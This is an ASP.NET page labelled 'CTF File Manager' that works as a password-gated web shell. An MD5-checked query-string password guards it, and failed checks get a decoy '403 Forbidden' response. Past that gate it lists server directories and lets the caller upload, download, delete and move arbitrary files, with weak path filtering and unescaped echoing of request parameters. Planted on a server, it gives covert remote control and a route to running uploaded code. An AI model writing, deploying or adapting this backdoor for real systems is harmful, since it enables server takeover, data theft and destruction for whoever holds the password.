<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Linq" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Text" %>

<script runat="server">
    string correctMD5 = "e662ddd93d6f72abfb31328821b595cc"; 

    string currentPath = "";

    protected void Page_Load(object sender, EventArgs e)
    {
        string inputPass = Request.QueryString["p"];

        if (string.IsNullOrEmpty(inputPass) || !VerifyMD5(inputPass, correctMD5))
        {
            Response.StatusCode = 403;
            Response.Write("<h1>403 Forbidden</h1>");
            Response.End();
        }

        currentPath = Request.QueryString["dir"] ?? "";
        currentPath = currentPath.Trim('/', '\\').Replace("..", "").Replace("\\", "/");

        // ====================== DOWNLOAD ======================
        if (Request.QueryString["action"] == "download" && !string.IsNullOrEmpty(Request.QueryString["file"]))
        {
            DownloadFile(Request.QueryString["file"]);
        }

        // ====================== DELETE ======================
        if (!string.IsNullOrEmpty(Request.QueryString["del"]))
        {
            DeleteFile(Request.QueryString["del"]);
            Response.Redirect("?p=" + Request.QueryString["p"] + "&dir=" + Server.UrlEncode(currentPath) + "&msg=deleted");
        }

        // ====================== MOVE ======================
        if (Request.QueryString["action"] == "move" && !string.IsNullOrEmpty(Request.QueryString["target"]))
        {
            MoveFile(Request.QueryString["target"], Request.QueryString["dest"]);
            Response.Redirect("?p=" + Request.QueryString["p"] + "&dir=" + Server.UrlEncode(currentPath) + "&msg=moved");
        }

        if (Request.QueryString["msg"] != null)
            lblMsg.Text = "<span style='color:lime'>✅ Operation Successful!</span>";
    }

    bool VerifyMD5(string input, string correctHash)
    {
        using (MD5 md5 = MD5.Create())
        {
            byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes(input));
            return BitConverter.ToString(hash).Replace("-", "").ToLower() == correctHash.ToLower();
        }
    }

    string GetFullPath(string relative)
    {
        string p = "~/" + currentPath;
        if (!string.IsNullOrEmpty(currentPath)) p += "/";
        return Server.MapPath(p + relative);
    }

    void DownloadFile(string fileName)
    {
        try
        {
            string fullPath = GetFullPath(Server.UrlDecode(fileName));
            if (File.Exists(fullPath))
            {
                Response.Clear();
                Response.ContentType = "application/octet-stream";
                Response.AddHeader("Content-Disposition", "attachment; filename=\"" + Server.UrlEncode(Path.GetFileName(fullPath)) + "\"");
                Response.TransmitFile(fullPath);
                Response.End();
            }
        }
        catch { }
    }

    void DeleteFile(string fileName)
    {
        try
        {
            string fullPath = GetFullPath(Server.UrlDecode(fileName));
            if (File.Exists(fullPath)) File.Delete(fullPath);
        }
        catch { }
    }

    void MoveFile(string sourceFile, string destFolder)
    {
        try
        {
            string source = GetFullPath(Server.UrlDecode(sourceFile));
            string destDir = GetFullPath(Server.UrlDecode(destFolder));
            string dest = Path.Combine(destDir, Path.GetFileName(source));

            if (File.Exists(source) && Directory.Exists(destDir))
                File.Move(source, dest);
        }
        catch { }
    }

    protected void btnUpload_Click(object sender, EventArgs e)
    {
        if (FileUpload1.HasFile)
        {
            try
            {
                string fileName = Path.GetFileName(FileUpload1.FileName);
                string savePath = GetFullPath(fileName);
                FileUpload1.SaveAs(savePath);
                lblMsg.Text = "<span style='color:lime'>✅ Uploaded: " + fileName + "</span>";
            }
            catch (Exception ex)
            {
                lblMsg.Text = "<span style='color:red'>Upload Failed: " + ex.Message + "</span>";
            }
        }
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>CTF File Manager</title>
    <style>
        body { font-family: Consolas, monospace; background: #0a0a0a; color: #00ff00; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #00aa00; padding: 10px; }
        th { background: #111; }
        a { color: #00ffff; text-decoration: none; }
        a:hover { color: white; }
        .dir { color: #ffff00; font-weight: bold; }
        .current-path { background:#111; padding:10px; border:1px solid #00ff00; margin:10px 0; }
        .actions a { margin-right: 12px; }
        .upload-box { border: 2px dashed #00ff00; padding: 15px; background: #111; margin:15px 0; }
    </style>
</head>
<body>
    <h1>🛠️ CTF File Manager</h1>

    <div class="current-path">
        <strong>Path:</strong> /<%= currentPath %> 
        <a href="?p=<%= Request.QueryString["p"] %>">[Root]</a>
    </div>

    <div class="upload-box">
        <h2>Upload File</h2>
        <form runat="server" enctype="multipart/form-data">
            <asp:FileUpload ID="FileUpload1" runat="server" />
            <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />
            <br/><br/>
            <asp:Label ID="lblMsg" runat="server" />
        </form>
    </div>

    <h2>📁 Files & Folders</h2>
    <table>
        <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Modified</th>
            <th>Actions</th>
        </tr>

        <!-- Parent -->
        <% if (!string.IsNullOrEmpty(currentPath)) { 
            string parent = currentPath.Contains("/") ? currentPath.Substring(0, currentPath.LastIndexOf("/")) : "";
        %>
        <tr>
            <td class="dir">📁 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(parent) %>">.. (Go Up)</a></td>
            <td>Folder</td>
            <td></td>
            <td></td>
            <td></td>
        </tr>
        <% } %>

        <!-- Folders -->
        <% 
            string physicalPath = Server.MapPath("~/" + currentPath);
            foreach (var dir in Directory.GetDirectories(physicalPath).Select(d => new DirectoryInfo(d)).OrderBy(d => d.Name))
            {
                string newPath = string.IsNullOrEmpty(currentPath) ? dir.Name : currentPath + "/" + dir.Name;
        %>
        <tr>
            <td class="dir">📁 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(newPath) %>"><%= dir.Name %></a></td>
            <td>Folder</td>
            <td>-</td>
            <td><%= dir.LastWriteTime.ToString("yyyy-MM-dd HH:mm") %></td>
            <td></td>
        </tr>
        <% } %>

        <!-- Files -->
        <% foreach (var file in Directory.GetFiles(physicalPath).Select(f => new FileInfo(f)).OrderBy(f => f.Name))
           {
               string encoded = Server.UrlEncode(file.Name);
        %>
        <tr>
            <td><%= file.Name %></td>
            <td>File</td>
            <td><%= (file.Length / 1024.0).ToString("0.##") %> KB</td>
            <td><%= file.LastWriteTime.ToString("yyyy-MM-dd HH:mm") %></td>
            <td class="actions">
                <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(currentPath) %>&action=download&file=<%= encoded %>">⬇️ Download</a>
                <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(currentPath) %>&del=<%= encoded %>" 
                   onclick="return confirm('Delete this file?')">🗑️ Delete</a>
                <a href="javascript:void(0)" onclick="moveFile('<%= encoded %>')">🔀 Move</a>
            </td>
        </tr>
        <% } %>
    </table>

    <!-- Move Form -->
    <div class="upload-box" id="moveForm" style="display:none;">
        <h2>Move File</h2>
        <form method="get">
            <input type="hidden" name="p" value="<%= Request.QueryString["p"] %>" />
            <input type="hidden" name="dir" value="<%= currentPath %>" />
            <input type="hidden" name="action" value="move" />
            <input type="hidden" id="source" name="target" />
            To Folder: <input type="text" name="dest" placeholder="folder or ../folder" style="width:300px;padding:6px;"/>
            <input type="submit" value="Move" />
            <button type="button" onclick="document.getElementById('moveForm').style.display='none'">Cancel</button>
        </form>
    </div>

    <script>
        function moveFile(filename) {
            document.getElementById('source').value = filename;
            document.getElementById('moveForm').style.display = 'block';
        }
    </script>
</body>
</html>
